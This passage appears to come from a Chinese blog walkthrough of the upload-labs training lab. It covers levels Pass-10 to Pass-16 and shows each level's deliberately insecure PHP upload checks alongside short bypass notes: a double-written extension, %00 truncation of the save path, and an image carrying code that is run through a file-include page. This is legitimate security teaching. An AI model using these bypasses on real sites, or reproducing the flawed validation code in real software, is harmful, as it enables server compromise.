class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = str_ireplace(<span class=\"variable\">$deny_ext</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$file_name</span>);  这里把文件替换成空</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>利用双写进行绕过 a.pphphp</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311200535082.png\" alt=\"image-20210311200535082\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311200557774.png\" alt=\"image-20210311200557774\"></p>\n<h2 id=\"pass-1100截断\"><a class=\"markdownIt-Anchor\" href=\"#pass-1100截断\">#</a> Pass-11 (%00 截断)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = substr(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],strrpos(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);  截取后缀名</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;save_path&#x27;</span>].<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">\t\t\t\t上面这里是GET</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在 POST 更改为 a.php%00 截断</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311204205040.png\" alt=\"image-20210311204205040\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311204322772.png\" alt=\"image-20210311204322772\"></p>\n<h2 id=\"pass-1200截断hex\"><a class=\"markdownIt-Anchor\" href=\"#pass-1200截断hex\">#</a> Pass-12 (%00 截断 hex)</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = substr(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],strrpos(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_path&#x27;</span>].<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">\t\t\t\t上面这里是POST</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传失败&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311204606304.png\" alt=\"image-20210311204606304\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311205039010.png\" alt=\"image-20210311205039010\"></p>\n<p>成功上传，访问 a.php</p>\n<h2 id=\"pass-13图片码利用includephp包含\"><a class=\"markdownIt-Anchor\" href=\"#pass-13图片码利用includephp包含\">#</a> Pass-13 (图片码，利用 include.php 包含)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getReailFileType</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = fopen(<span class=\"variable\">$filename</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$bin</span> = fread(<span class=\"variable\">$file</span>, <span class=\"number\">2</span>); <span class=\"comment\">//只读2字节</span></span><br><span class=\"line\">    fclose(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">    <span class=\"variable\">$strInfo</span> = @unpack(<span class=\"string\">&quot;C2chars&quot;</span>, <span class=\"variable\">$bin</span>);    </span><br><span class=\"line\">    <span class=\"variable\">$typeCode</span> = intval(<span class=\"variable\">$strInfo</span>[<span class=\"string\">&#x27;chars1&#x27;</span>].<span class=\"variable\">$strInfo</span>[<span class=\"string\">&#x27;chars2&#x27;</span>]);    </span><br><span class=\"line\">    <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;&#x27;</span>;    </span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(<span class=\"variable\">$typeCode</span>)&#123;      </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">255216</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;jpg&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">13780</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;png&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;        </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">7173</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;gif&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;unknown&#x27;</span>;</span><br><span class=\"line\">        &#125;    </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$fileType</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file_type</span> = getReailFileType(<span class=\"variable\">$temp_file</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$file_type</span> == <span class=\"string\">&#x27;unknown&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_type</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311213940794.png\" alt=\"image-20210311213814876\"></p>\n<p>直接上传 b.jpg，再进行文件包含</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311214019233.png\" alt=\"\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311214113434.png\" alt=\"image-20210311214113434\"></p>\n<h2 id=\"pass-14同13相同图片码\"><a class=\"markdownIt-Anchor\" href=\"#pass-14同13相同图片码\">#</a> Pass-14 (同 13 相同图片码)</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isImage</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$types</span> = <span class=\"string\">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file_exists(<span class=\"variable\">$filename</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$info</span> = getimagesize(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = image_type_to_extension(<span class=\"variable\">$info</span>[<span class=\"number\">2</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(stripos(<span class=\"variable\">$types</span>,<span class=\"variable\">$ext</span>)&gt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$ext</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$res</span> = isImage(<span class=\"variable\">$temp_file</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"variable\">$res</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"variable\">$res</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"pass-15同13相同图片码\"><a class=\"markdownIt-Anchor\" href=\"#pass-15同13相同图片码\">#</a> Pass-15 (同 13 相同图片码)</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isImage</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//需要开启php_exif模块</span></span><br><span class=\"line\">    <span class=\"variable\">$image_type</span> = exif_imagetype(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (<span class=\"variable\">$image_type</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> IMAGETYPE_GIF:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;gif&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> IMAGETYPE_JPEG:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;jpg&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> IMAGETYPE_PNG:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;png&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;    </span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$res</span> = isImage(<span class=\"variable\">$temp_file</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"variable\">$res</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$res</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"pass-16图片渲染绕过\"><a class=\"markdownIt-Anchor\" href=\"#pass-16图片渲染绕过\">#</a> Pass-16 (图片渲染绕过)</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$filetype</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$tmpname</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>=UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.basename(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获得上传文件的扩展名</span></span><br><span class=\"line\">    <span class=\"variable\">$fileext</span>= substr(strrchr(<span class=\"variable\">$filename</span>,<span class=\"string\">&quot;.&quot;</span>),<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;jpg&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = imagecreatefromjpeg(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class=\"line\">                @unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">              